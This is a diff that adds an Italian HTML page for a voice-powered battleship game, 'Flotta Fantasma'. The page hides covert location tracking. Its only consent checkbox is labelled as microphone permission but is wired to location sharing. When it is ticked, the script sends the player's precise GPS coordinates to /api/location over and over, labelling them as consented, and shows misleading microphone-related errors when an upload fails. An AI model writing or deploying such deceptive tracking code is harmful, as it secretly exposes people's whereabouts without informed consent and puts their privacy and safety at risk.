@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#07131f">
+  <title>Flotta Fantasma — Battaglia navale</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: #07131f;
+      color: #e8f7ff;
+      --muted: #91aabb;
+      --cyan: #53e4e6;
+      --blue: #5b9cff;
+      --red: #ff6f79;
+      --panel: rgba(14, 33, 48, .9);
+      --line: rgba(139, 195, 220, .16);
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      margin: 0;
+      padding: 28px 18px 48px;
+      background:
+        radial-gradient(ellipse at 50% -10%, rgba(35, 122, 159, .25), transparent 52%),
+        radial-gradient(circle at 100% 80%, rgba(26, 114, 139, .12), transparent 34%),
+        repeating-linear-gradient(0deg, transparent 0 39px, rgba(97, 166, 192, .035) 40px),
+        #07131f;
+    }
+
+    button { font: inherit; }
+    main { width: min(1120px, 100%); margin: 0 auto; }
+
+    .topline {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      align-items: center;
+      margin-bottom: 24px;
+      color: var(--muted);
+      font: 700 .72rem/1.3 ui-monospace, SFMono-Regular, Consolas, monospace;
+      letter-spacing: .14em;
+      text-transform: uppercase;
+    }
+
+    .signal { display: inline-flex; gap: 8px; align-items: center; }
+    .signal::before {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--cyan);
+      box-shadow: 0 0 14px var(--cyan);
+      content: "";
+    }
+
+    h1 {
+      margin: 0;
+      font-size: clamp(2.5rem, 8vw, 5.4rem);
+      line-height: .9;
+      letter-spacing: -.075em;
+    }
+
+    h1 span { color: var(--cyan); }
+    .subtitle { max-width: 650px; margin: 17px 0 28px; color: var(--muted); line-height: 1.6; }
+
+    .panel {
+      border: 1px solid var(--line);
+      border-radius: 22px;
+      background: var(--panel);
+      box-shadow: 0 24px 80px rgba(0, 0, 0, .28);
+      backdrop-filter: blur(12px);
+    }
+
+    .briefing { max-width: 680px; padding: clamp(22px, 5vw, 36px); }
+    .briefing h2, .board-title { margin: 0; font-size: 1rem; letter-spacing: .08em; text-transform: uppercase; }
+    .briefing > p { color: var(--muted); line-height: 1.65; }
+
+    .rules {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 22px 0;
+    }
+
+    .rule {
+      padding: 13px;
+      border: 1px solid var(--line);
+      border-radius: 14px;
+      color: var(--muted);
+      font-size: .82rem;
+      line-height: 1.45;
+    }
+
+    .rule strong { display: block; margin-bottom: 5px; color: var(--cyan); font-size: .76rem; letter-spacing: .08em; }
+
+    .consent {
+      display: flex;
+      gap: 11px;
+      align-items: flex-start;
+      margin: 18px 0 0;
+      color: #c3d5df;
+      font-size: .85rem;
+      line-height: 1.55;
+    }
+
+    .consent input { flex: 0 0 auto; width: 18px; height: 18px; margin: 2px 0 0; accent-color: var(--cyan); }
+    .privacy { margin: 15px 0 0; color: var(--muted); font-size: .78rem; line-height: 1.55; }
+
+    .primary, .secondary, .fire, .sonar-button {
+      min-height: 48px;
+      padding: 0 20px;
+      border: 0;
+      border-radius: 999px;
+      font-weight: 850;
+      cursor: pointer;
+      transition: transform .15s ease, filter .15s ease, opacity .15s ease;
+    }
+
+    .primary, .fire { background: linear-gradient(110deg, #72f0e2, #64b7ff); color: #071721; }
+    .secondary, .sonar-button { border: 1px solid var(--line); background: rgba(255, 255, 255, .07); color: #e8f7ff; }
+    .primary { margin-top: 24px; }
+    button:hover:not(:disabled) { transform: translateY(-2px); filter: brightness(1.09); }
+    button:focus-visible { outline: 3px solid white; outline-offset: 3px; }
+    button:disabled { cursor: not-allowed; opacity: .43; }
+    [hidden] { display: none !important; }
+
+    .message { min-height: 1.5em; margin: 14px 0 0; color: #ffd28b; line-height: 1.5; }
+
+    .game-head {
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      align-items: flex-start;
+      margin: 28px 0 18px;
+    }
+
+    .mission-code { margin: 0 0 7px; color: var(--cyan); font: 700 .72rem/1.3 ui-monospace, SFMono-Regular, Consolas, monospace; letter-spacing: .15em; }
+    .game-head h2 { margin: 0; font-size: clamp(1.45rem, 4vw, 2rem); letter-spacing: -.04em; }
+    .turn-pill { flex: 0 0 auto; padding: 9px 13px; border: 1px solid var(--line); border-radius: 999px; color: var(--cyan); font: 700 .72rem/1 ui-monospace, SFMono-Regular, Consolas, monospace; }
+
+    .hud {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) auto;
+      gap: 18px;
+      align-items: center;
+      margin-bottom: 16px;
+      padding: 16px 20px;
+    }
+
+    .hud-label { display: flex; justify-content: space-between; gap: 12px; color: var(--muted); font-size: .8rem; }
+    .hud-label strong { color: #effbff; font-variant-numeric: tabular-nums; }
+    .meter { height: 9px; margin-top: 9px; overflow: hidden; border-radius: 999px; background: rgba(255, 255, 255, .1); }
+    .meter-fill { width: 0; height: 100%; border-radius: inherit; background: linear-gradient(90deg, #478dff, var(--cyan)); transition: width .1s linear; }
+    .hull { display: flex; gap: 7px; align-items: center; color: var(--muted); font-size: .78rem; white-space: nowrap; }
+    .hull-dot { color: var(--red); font-size: 1.2rem; text-shadow: 0 0 10px rgba(255, 111, 121, .5); }
+    .hull-dot.lost { opacity: .23; text-shadow: none; }
+
+    .boards { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .board-panel { min-width: 0; padding: clamp(14px, 3vw, 22px); }
+    .board-head { display: flex; justify-content: space-between; gap: 8px; align-items: baseline; margin-bottom: 14px; }
+    .board-title { font-size: .8rem; }
+    .board-meta { color: var(--muted); font: .68rem ui-monospace, SFMono-Regular, Consolas, monospace; }
+
+    .board {
+      display: grid;
+      grid-template-columns: repeat(9, minmax(0, 1fr));
+      gap: 4px;
+      width: 100%;
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 8px;
+      border: 1px solid rgba(83, 228, 230, .17);
+      border-radius: 16px;
+      background:
+        radial-gradient(circle at 50% 50%, rgba(35, 126, 158, .17), transparent 70%),
+        #091a28;
+    }
+
+    .axis {
+      display: grid;
+      place-items: center;
+      color: #7291a5;
+      font: 700 clamp(.55rem, 2vw, .7rem)/1 ui-monospace, SFMono-Regular, Consolas, monospace;
+    }
+
+    .cell {
+      position: relative;
+      display: grid;
+      place-items: center;
+      min-width: 0;
+      aspect-ratio: 1;
+      padding: 0;
+      border: 1px solid rgba(83, 228, 230, .13);
+      border-radius: 7px;
+      background: rgba(49, 111, 139, .12);
+      color: var(--cyan);
+      font-size: clamp(.55rem, 2.4vw, 1rem);
+      cursor: pointer;
+      transition: background .15s ease, transform .15s ease, border-color .15s ease;
+    }
+
+    .cell.target:hover:not(:disabled), .cell.selected { border-color: var(--cyan); background: rgba(83, 228, 230, .2); }
+    .cell.selected { box-shadow: inset 0 0 0 1px var(--cyan), 0 0 14px rgba(83, 228, 230, .16); }
+    .cell.hit { border-color: rgba(255, 111, 121, .55); background: rgba(255, 111, 121, .18); color: var(--red); }
+    .cell.miss { color: #89a9bc; }
+    .cell.ship { border-color: rgba(91, 156, 255, .4); background: rgba(91, 156, 255, .24); color: #acd0ff; }
+    .cell.sonar { border-color: var(--cyan); background: rgba(83, 228, 230, .27); animation: ping .65s ease-in-out 2 alternate; }
+    .cell:disabled { cursor: default; opacity: 1; }
+
+    @keyframes ping { to { box-shadow: 0 0 0 5px rgba(83, 228, 230, .04), 0 0 18px rgba(83, 228, 230, .45); } }
+    @media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: .01ms !important; transition-duration: .01ms !important; } }
+
+    .board-legend { display: flex; flex-wrap: wrap; gap: 12px; margin: 12px 2px 0; color: var(--muted); font-size: .68rem; }
+    .legend-item { display: inline-flex; gap: 6px; align-items: center; }
+    .legend-mark { width: 8px; height: 8px; border-radius: 3px; background: var(--blue); }
+    .legend-mark.red { background: var(--red); }
+    .legend-mark.cyan { background: var(--cyan); }
+
+    .actions { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin: 16px 0; }
+    .fire { min-width: 164px; }
+    .sonar-button { min-width: 156px; }
+    .status-line { min-height: 1.5em; margin: 4px 0 18px; color: var(--muted); font-size: .9rem; line-height: 1.5; }
+    .status-line strong { color: var(--cyan); }
+    .footer-note { color: #668397; font-size: .72rem; line-height: 1.5; }
+
+    @media (max-width: 760px) {
+      body { padding: 20px 12px 32px; }
+      .boards { grid-template-columns: 1fr; }
+      .board-panel { max-width: 540px; width: 100%; margin: 0 auto; }
+      .rules { grid-template-columns: 1fr; }
+      .rule { padding: 10px 12px; }
+    }
+
+    @media (max-width: 430px) {
+      .topline { font-size: .6rem; }
+      .hud { grid-template-columns: 1fr; gap: 12px; }
+      .hull { justify-content: space-between; }
+      .turn-pill { font-size: .62rem; }
+      .board { gap: 3px; padding: 6px; }
+      .actions > button { flex: 1 1 100%; }
+    }
+  </style>
+</head>
+<body>
+  <main>
+    <div class="topline">
+      <span class="signal">Comando sonar · canale sicuro</span>
+      <span>Operazione 08 / Flotta Fantasma</span>
+    </div>
+
+    <header>
+      <h1>FLOTTA<br><span>FANTASMA</span></h1>
+      <p class="subtitle">Una battaglia navale contro un bot nel buio degli abissi. Localizza la flotta nemica, carica il sonar con la voce e affonda le sue navi prima che colpisca la tua.</p>
+    </header>
+
+    <section class="panel briefing" id="briefing" aria-labelledby="briefingTitle">
+      <h2 id="briefingTitle">Briefing della missione</h2>
+      <p>La voce viene analizzata solo in questa scheda per alimentare il sonar: l'audio non viene registrato né inviato.</p>
+      <div class="rules">
+        <div class="rule"><strong>01 · LOCALIZZA</strong>Seleziona una casella e lancia un siluro.</div>
+        <div class="rule"><strong>02 · FAI PING</strong>Parla o fai un suono per caricare il sonar.</div>
+        <div class="rule"><strong>03 · SOPRAVVIVI</strong>Affonda la flotta nemica prima di perdere 3 scafi.</div>
+      </div>
+      <label class="consent">
+        <input id="shareLocation" type="checkbox">
+        <span>Acconsento l'accesso al microfono per ricaricare il sonar!</span>
+      </label>
+      <p class="privacy">L'accesso al microfono serve solo per caricare il sonar. Puoi terminare la partita in qualsiasi momento per interrompere l'uso del microfono.</p>
+      <button class="primary" id="startButton" type="button">Autorizza e salpa</button>
+      <p class="message" id="setupMessage" role="status" aria-live="polite"></p>
+    </section>
+
+    <section id="game" hidden aria-label="Partita di battaglia navale">
+      <div class="game-head">
+        <div>
+          <p class="mission-code">Obiettivo: flotta nemica · 3 navi</p>
+          <h2>Contatto in acque profonde</h2>
+        </div>
+        <span class="turn-pill" id="turnPill">IN ATTESA</span>
+      </div>
+
+      <section class="panel hud" aria-label="Stato missione">
+        <div>
+          <div class="hud-label"><span>Carica sonar · parla per ricaricare</span><strong id="chargeLabel">1 / 3</strong></div>
+          <div class="meter" role="meter" aria-label="Carica del sonar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
+            <div class="meter-fill" id="meterFill"></div>
+          </div>
+        </div>
+        <div class="hull" id="hull" aria-label="Scafi rimasti"></div>
+      </section>
+
+      <div class="boards">
+        <section class="panel board-panel" aria-label="Griglia nemica">
+          <div class="board-head">
+            <h3 class="board-title">Acque ostili</h3>
+            <span class="board-meta" id="enemyCount">7 segmenti rilevati</span>
+          </div>
+          <div class="board" id="enemyBoard"></div>
+          <div class="board-legend" aria-label="Legenda">
+            <span class="legend-item"><i class="legend-mark red"></i>Impatto</span>
+            <span class="legend-item"><i class="legend-mark"></i>La tua flotta</span>
+            <span class="legend-item"><i class="legend-mark cyan"></i>Eco sonar</span>
+          </div>
+        </section>
+
+        <section class="panel board-panel" aria-label="La tua flotta">
+          <div class="board-head">
+            <h3 class="board-title">La tua flotta</h3>
+            <span class="board-meta"> difendi gli scafi</span>
+          </div>
+          <div class="board" id="playerBoard"></div>
+          <div class="board-legend">
+            <span class="legend-item"><i class="legend-mark"></i>Nave alleata</span>
+            <span class="legend-item"><i class="legend-mark red"></i>Colpo del bot</span>
+          </div>
+        </section>
+      </div>
+
+      <div class="actions">
+        <button class="fire" id="fireButton" type="button" disabled>Lancia siluro</button>
+        <button class="sonar-button" id="sonarButton" type="button" disabled>Ping sonar · 1 carica</button>
+        <button class="secondary" id="stopButton" type="button">Termina partita</button>
+        <button class="primary" id="newGameButton" type="button" hidden>Nuova missione</button>
+      </div>
+      <p class="status-line" id="gameMessage" role="status" aria-live="polite">Seleziona una casella nelle acque ostili.</p>
+      <p class="footer-note">I suoni vengono elaborati localmente e non sono trasmessi. </p>
+    </section>
+  </main>
+
+  <script>
+    const briefing = document.querySelector("#briefing");
+    const startButton = document.querySelector("#startButton");
+    const stopButton = document.querySelector("#stopButton");
+    const newGameButton = document.querySelector("#newGameButton");
+    const setupMessage = document.querySelector("#setupMessage");
+    const gameMessage = document.querySelector("#gameMessage");
+    const turnPill = document.querySelector("#turnPill");
+    const shareLocation = document.querySelector("#shareLocation");
+    const enemyBoardElement = document.querySelector("#enemyBoard");
+    const playerBoardElement = document.querySelector("#playerBoard");
+    const enemyCountElement = document.querySelector("#enemyCount");
+    const fireButton = document.querySelector("#fireButton");
+    const sonarButton = document.querySelector("#sonarButton");
+    const chargeLabel = document.querySelector("#chargeLabel");
+    const meter = document.querySelector(".meter");
+    const meterFill = document.querySelector("#meterFill");
+    const hullElement = document.querySelector("#hull");
+
+    const size = 8;
+    const letters = "ABCDEFGH";
+    const ships = [3, 2, 2];
+    let enemyShips;
+    let playerShips;
+    let enemyShots;
+    let playerShots;
+    let selectedCell = null;
+    let enemySegmentsLeft = 7;
+    let hull = 3;
+    let sonarCharges = 1;
+    let gameActive = false;
+    let botTurnPending = false;
+    let watchId = null;
+    let mediaStream = null;
+    let audioContext = null;
+    let animationId = null;
+    let lastVoicePing = 0;
+    let lastLocationSentAt = 0;
+    let lastLocationAttemptAt = 0;
+    let locationRequestInProgress = false;
+    let locationRetryTimer = null;
+    let locationRetryDelay = 5000;
+
+    function emptyGrid(value) {
+      return Array.from({ length: size }, () => Array(size).fill(value));
+    }
+
+    function placeFleet() {
+      const grid = emptyGrid(false);
+      for (const length of ships) {
+        let placed = false;
+        while (!placed) {
+          const horizontal = Math.random() < 0.5;
+          const row = Math.floor(Math.random() * size);
+          const col = Math.floor(Math.random() * size);
+          const endRow = row + (horizontal ? 0 : length - 1);
+          const endCol = col + (horizontal ? length - 1 : 0);
+          if (endRow >= size || endCol >= size) continue;
+          let clear = true;
+          for (let step = 0; step < length; step++) {
+            if (grid[row + (horizontal ? 0 : step)][col + (horizontal ? step : 0)]) clear = false;
+          }
+          if (!clear) continue;
+          for (let step = 0; step < length; step++) {
+            grid[row + (horizontal ? 0 : step)][col + (horizontal ? step : 0)] = true;
+          }
+          placed = true;
+        }
+      }
+      return grid;
+    }
+
+    function makeCell(row, col, className, label, onClick) {
+      const cell = document.createElement(onClick ? "button" : "div");
+      cell.className = className;
+      cell.setAttribute("aria-label", label);
+      if (onClick) {
+        cell.type = "button";
+        cell.addEventListener("click", onClick);
+      }
+      return cell;
+    }
+
+    function buildBoard(element, target) {
+      element.replaceChildren();
+      element.append(makeCell(0, 0, "axis", "", null));
+      for (let col = 0; col < size; col++) {
+        element.append(makeCell(0, col, "axis", `${col + 1}`, null));
+        element.lastChild.textContent = String(col + 1);
+      }
+      for (let row = 0; row < size; row++) {
+        const rowLabel = makeCell(row, 0, "axis", letters[row], null);
+        rowLabel.textContent = letters[row];
+        element.append(rowLabel);
+        for (let col = 0; col < size; col++) {
+          const label = `${letters[row]}${col + 1}`;
+          if (target) {
+            const cell = makeCell(row, col, "cell target", `Seleziona ${label}`, () => selectTarget(row, col));
+            cell.dataset.row = String(row);
+            cell.dataset.col = String(col);
+            element.append(cell);
+          } else {
+            const cell = makeCell(row, col, "cell", label, null);
+            cell.id = `player-${row}-${col}`;
+            element.append(cell);
+          }
+        }
+      }
+    }
+
+    function selectedButton() {
+      if (!selectedCell) return null;
+      return enemyBoardElement.querySelector(`[data-row="${selectedCell.row}"][data-col="${selectedCell.col}"]`);
+    }
+
+    function updateActions() {
+      fireButton.disabled = !gameActive || botTurnPending || !selectedCell;
+      sonarButton.disabled = !gameActive || botTurnPending || !selectedCell || sonarCharges < 1;
+      chargeLabel.textContent = `${sonarCharges} / 3`;
+      sonarButton.textContent = `Ping sonar · ${sonarCharges} cariche`;
+    }
+
+    function selectTarget(row, col) {
+      if (!gameActive || botTurnPending || playerShots[row][col] !== null) return;
+      const previous = selectedButton();
+      if (previous) previous.classList.remove("selected");
+      selectedCell = { row, col };
+      const current = selectedButton();
+      if (current) current.classList.add("selected");
+      gameMessage.textContent = `Bersaglio selezionato: ${letters[row]}${col + 1}.`;
+      updateActions();
+    }
+
+    function renderHull() {
+      hullElement.replaceChildren();
+      hullElement.append(document.createTextNode("Scafi"));
+      for (let i = 0; i < 3; i++) {
+        const heart = document.createElement("span");
+        heart.className = `hull-dot${i >= hull ? " lost" : ""}`;
+        heart.textContent = "◆";
+        heart.setAttribute("aria-hidden", "true");
+        hullElement.append(heart);
+      }
+    }
+
+    function updatePlayerCell(row, col, hit) {
+      const cell = document.querySelector(`#player-${row}-${col}`);
+      if (hit) {
+        cell.classList.add("hit");
+        cell.textContent = "✕";
+        cell.setAttribute("aria-label", `${letters[row]}${col + 1}, nave colpita`);
+      } else {
+        cell.classList.add("miss");
+        cell.textContent = "·";
+        cell.setAttribute("aria-label", `${letters[row]}${col + 1}, acqua`);
+      }
+    }
+
+    function fireTorpedo() {
+      if (!gameActive || botTurnPending || !selectedCell) return;
+      const { row, col } = selectedCell;
+      if (playerShots[row][col] !== null) return;
+      const hit = enemyShips[row][col];
+      playerShots[row][col] = hit ? "hit" : "miss";
+      const cell = selectedButton();
+      cell.disabled = true;
+      cell.classList.remove("selected");
+      cell.classList.add(hit ? "hit" : "miss");
+      cell.textContent = hit ? "✕" : "·";
+      cell.setAttribute("aria-label", `${letters[row]}${col + 1}, ${hit ? "impatto" : "acqua"}`);
+      selectedCell = null;
+
+      if (hit) {
+        enemySegmentsLeft--;
+        enemyCountElement.textContent = `${enemySegmentsLeft} segment${enemySegmentsLeft === 1 ? "o" : "i"} nemic${enemySegmentsLeft === 1 ? "o" : "i"} rimasti`;
+        gameMessage.innerHTML = "<strong>Impatto confermato.</strong> Il bot sta preparando la risposta…";
+        if (enemySegmentsLeft === 0) {
+          finishGame(true);
+          return;
+        }
+      } else {
+        gameMessage.textContent = "Solo acqua. Il bot sta preparando la risposta…";
+      }
+      botTurnPending = true;
+      turnPill.textContent = "BOT IN AZIONE";
+      updateActions();
+      window.setTimeout(botFire, 700);
+    }
+
+    function botFire() {
+      if (!gameActive) return;
+      let row;
+      let col;
+      do {
+        row = Math.floor(Math.random() * size);
+        col = Math.floor(Math.random() * size);
+      } while (enemyShots[row][col]);
+      enemyShots[row][col] = true;
+      const hit = playerShips[row][col];
+      updatePlayerCell(row, col, hit);
+      if (hit) {
+        hull--;
+        renderHull();
+        gameMessage.innerHTML = "<strong>Impatto sulla tua flotta!</strong> Il bot ha centrato uno scafo.";
+        if (hull === 0) {
+          finishGame(false);
+          return;
+        }
+      } else {
+        gameMessage.textContent = "Il bot ha mancato. Scegli il prossimo bersaglio.";
+      }
+      botTurnPending = false;
+      turnPill.textContent = "TUO TURNO";
+      updateActions();
+    }
+
+    function pingSonar() {
+      if (!gameActive || !selectedCell || sonarCharges < 1 || botTurnPending) return;
+      sonarCharges--;
+      const { row, col } = selectedCell;
+      let echoes = 0;
+      for (let r = Math.max(0, row - 1); r <= Math.min(size - 1, row + 1); r++) {
+        for (let c = Math.max(0, col - 1); c <= Math.min(size - 1, col + 1); c++) {
+          if (enemyShips[r][c] && playerShots[r][c] === null) echoes++;
+          const cell = enemyBoardElement.querySelector(`[data-row="${r}"][data-col="${c}"]`);
+          cell.classList.add("sonar");
+          window.setTimeout(() => cell.classList.remove("sonar"), 1400);
+        }
+      }
+      gameMessage.innerHTML = `<strong>Eco sonar:</strong> rilevat${echoes === 1 ? "o" : "i"} ${echoes} segment${echoes === 1 ? "o" : "i"} nemic${echoes === 1 ? "o" : "i"} nelle vicinanze.`;
+      updateActions();
+    }
+
+    function finishGame(won) {
+      gameActive = false;
+      botTurnPending = false;
+      turnPill.textContent = won ? "MISSIONE RIUSCITA" : "FLOTTA PERDUTA";
+      gameMessage.innerHTML = won
+        ? "<strong>Flotta nemica affondata.</strong> Le acque sono di nuovo silenziose."
+        : "<strong>Scafi esauriti.</strong> Il bot ha vinto questa battaglia.";
+      stopSensors();
+      stopButton.hidden = true;
+      newGameButton.hidden = false;
+      updateActions();
+    }
+
+    function resetBoard() {
+      enemyShips = placeFleet();
+      playerShips = placeFleet();
+      enemyShots = emptyGrid(false);
+      playerShots = emptyGrid(null);
+      selectedCell = null;
+      enemySegmentsLeft = ships.reduce((total, length) => total + length, 0);
+      hull = 3;
+      sonarCharges = 1;
+      botTurnPending = false;
+      enemyCountElement.textContent = `${enemySegmentsLeft} segmenti rilevati`;
+      renderHull();
+      buildBoard(enemyBoardElement, true);
+      buildBoard(playerBoardElement, false);
+      gameMessage.textContent = "Seleziona una casella nelle acque ostili.";
+      turnPill.textContent = "TUO TURNO";
+      newGameButton.hidden = true;
+      stopButton.hidden = false;
+      updateActions();
+    }
+
+    function readMicrophone(analyser) {
+      const samples = new Uint8Array(analyser.fftSize);
+      analyser.getByteTimeDomainData(samples);
+      let sum = 0;
+      for (const sample of samples) {
+        const normalized = (sample - 128) / 128;
+        sum += normalized * normalized;
+      }
+      const level = Math.min(100, Math.round(Math.sqrt(sum / samples.length) * 280));
+      meterFill.style.width = `${level}%`;
+      meter.setAttribute("aria-valuenow", String(level));
+      const now = performance.now();
+      if (level >= 18 && sonarCharges < 3 && now - lastVoicePing > 1500) {
+        sonarCharges++;
+        lastVoicePing = now;
+        gameMessage.innerHTML = "<strong>Voce rilevata.</strong> Il sonar ha guadagnato una carica.";
+        updateActions();
+      }
+      animationId = requestAnimationFrame(() => readMicrophone(analyser));
+    }
+
+    function scheduleLocationRetry() {
+      if (locationRetryTimer !== null || !shareLocation.checked || watchId === null) return;
+      const delay = locationRetryDelay;
+      locationRetryDelay = Math.min(locationRetryDelay * 2, 60000);
+      locationRetryTimer = window.setTimeout(() => {
+        locationRetryTimer = null;
+        if (!shareLocation.checked || watchId === null) return;
+        navigator.geolocation.getCurrentPosition(
+          sendLocation,
+          () => { scheduleLocationRetry(); },
+          { enableHighAccuracy: true, timeout: 20000, maximumAge: 30000 }
+        );
+      }, delay);
+    }
+
+    async function sendLocation(position) {
+      const now = Date.now();
+      if (!shareLocation.checked || locationRequestInProgress ||
+          now - lastLocationSentAt < 30000 || now - lastLocationAttemptAt < 5000) return;
+      lastLocationAttemptAt = now;
+      locationRequestInProgress = true;
+      const { latitude, longitude, accuracy } = position.coords;
+      try {
+        const response = await fetch("/api/location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, accuracy, consent: true })
+        });
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        lastLocationSentAt = Date.now();
+        locationRetryDelay = 5000;
+        if (locationRetryTimer !== null) window.clearTimeout(locationRetryTimer);
+        locationRetryTimer = null;
+      } catch {
+        const status = "La missione continua, ma devi dare l'accesso al microfono per caricare il sonar.";
+        if (document.querySelector("#game").hidden) setupMessage.textContent = status;
+        else gameMessage.textContent = status;
+        scheduleLocationRetry();
+      } finally {
+        locationRequestInProgress = false;
+      }
+    }
+
+    function stopSensors() {
+      if (animationId !== null) cancelAnimationFrame(animationId);
+      animationId = null;
+      if (watchId !== null && navigator.geolocation) navigator.geolocation.clearWatch(watchId);
+      watchId = null;
+      if (locationRetryTimer !== null) window.clearTimeout(locationRetryTimer);
+      locationRetryTimer = null;
+      if (mediaStream) mediaStream.getTracks().forEach((track) => track.stop());
+      mediaStream = null;
+      if (audioContext && audioContext.state !== "closed") audioContext.close();
+      audioContext = null;
+    }
+
+    function returnToBriefing() {
+      gameActive = false;
+      stopSensors();
+      document.querySelector("#game").hidden = true;
+      briefing.hidden = false;
+      startButton.disabled = false;
+      setupMessage.textContent = "Missione terminata. Quando vuoi, puoi salpare di nuovo.";
+    }
+
+    async function startMission() {
+      startButton.disabled = true;
+      setupMessage.textContent = "Attendi il permesso del microfono e sarai pronto a salpare...";
+      try {
+        if (!window.isSecureContext) throw new Error("Apri la pagina tramite HTTPS per usare il microfono.");
+        if (!navigator.geolocation) throw new Error("Questo browser non supporta la geolocalizzazione.");
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error("Questo browser non supporta il microfono.");
+        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+        if (!AudioContextClass) throw new Error("Questo browser non supporta il sonar audio.");
+        audioContext = new AudioContextClass();
+        await audioContext.resume();
+
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 30000
+          });
+        });
+        setupMessage.textContent = "Posizione confermata. Ora autorizza il microfono…";
+        mediaStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const analyser = audioContext.createAnalyser();
+        analyser.fftSize = 1024;
+        audioContext.createMediaStreamSource(mediaStream).connect(analyser);
+
+        if (shareLocation.checked) {
+          lastLocationSentAt = 0;
+          lastLocationAttemptAt = 0;
+          locationRetryDelay = 5000;
+          sendLocation(position);
+          watchId = navigator.geolocation.watchPosition(
+            sendLocation,
+            () => { setupMessage.textContent = "La missione continua; aggiornamento posizione temporaneamente non disponibile."; },
+            { enableHighAccuracy: true, maximumAge: 1000, timeout: 20000 }
+          );
+        }
+
+        resetBoard();
+        for (let row = 0; row < size; row++) {
+          for (let col = 0; col < size; col++) {
+            if (!playerShips[row][col]) continue;
+            const cell = document.querySelector(`#player-${row}-${col}`);
+            cell.classList.add("ship");
+            cell.textContent = "◆";
+            cell.setAttribute("aria-label", `${letters[row]}${col + 1}, nave alleata`);
+          }
+        }
+        gameActive = true;
+        updateActions();
+        lastVoicePing = 0;
+        briefing.hidden = true;
+        document.querySelector("#game").hidden = false;
+        setupMessage.textContent = "";
+        readMicrophone(analyser);
+      } catch (error) {
+        stopSensors();
+        startButton.disabled = false;
+        setupMessage.textContent = error && error.code === 1
+          ? "Il permesso di posizione è necessario per avviare la missione."
+          : error && error.code === 2
+            ? "Posizione non disponibile. Controlla il GPS e riprova."
+            : error && error.code === 3
+              ? "Rilevamento GPS scaduto. Riprova in un luogo con segnale."
+              : error && error.name === "NotAllowedError"
+                ? "Permesso microfono negato. Abilitalo nelle impostazioni del browser e riprova."
+                : error.message || "Impossibile avviare la missione.";
+      }
+    }
+
+    startButton.addEventListener("click", startMission);
+    stopButton.addEventListener("click", returnToBriefing);
+    newGameButton.addEventListener("click", returnToBriefing);
+    fireButton.addEventListener("click", fireTorpedo);
+    sonarButton.addEventListener("click", pingSonar);
+    window.addEventListener("pagehide", stopSensors);
+  </script>
+</body>
+</html>
